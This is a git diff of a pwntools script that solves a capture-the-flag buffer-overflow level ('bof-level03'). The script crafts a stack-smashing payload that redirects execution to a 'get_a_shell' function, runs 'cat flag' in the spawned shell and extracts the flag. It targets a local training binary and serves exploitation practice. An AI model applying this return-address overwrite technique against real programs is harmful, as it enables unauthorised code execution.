@@ -1,17 +1,21 @@
 from pwn import *
-import sys
+import os
 
-context.terminal = ["tmux", "splitw", "-h"]
+DEBUG = False # toggles gdb.debug or process
+elf = ELF('./bof-level03') # replace this with the actual level
 
-elf = ELF("./bof-level03")
+# launch the main process (still boilerplate)
+if DEBUG:
+    context.log_level = 'DEBUG'
+    context.terminal = ['tmux', 'splitw', '-h']
+    io = elf.debug(env={})
+else:
+    io = elf.process(env={})
+
+# END SETUP BOILERPLATE
+# BEGIN CHALLENGE-SPECIFIC CODE
 
 get_shell_addr = p64(elf.symbols["get_a_shell"])
-
-# a1 = 0x4141414141414141 # aaaaa
-# b1 = 0x4242424242424242 # bbbb
-#
-# a2 = 0x4040404040404040 
-# b2 = 0x4444444444444444
 
 val = 0x101010101010101
 val2 = 0x202020202020202
@@ -21,15 +25,14 @@ b = 0x4847464544434241 - val2
 
 buf_len = 0x30 - 0x10
 
-# p = gdb.debug([elf.path], gdbscript='''
-#          b *0x000000000040085e
-#          continue 
-# ''')
+payload = get_shell_addr + (buf_len - 8) * b"A" + p64(b) + p64(a)  + 8 * b"A" + get_shell_addr
+io.sendline(payload)
 
-p = process([elf.path])
+# END CHALLENGE-SPECIFIC CODE
+# BEGIN FLAG RETRIEVAL BOILERPLATE
 
-message = get_shell_addr + (buf_len - 8) * b"A" + p64(b) + p64(a)  + 8 * b"A" + get_shell_addr
+import re
+io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
+flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
+print(flag)
 
-p.sendline(message)
-
-p.interactive()
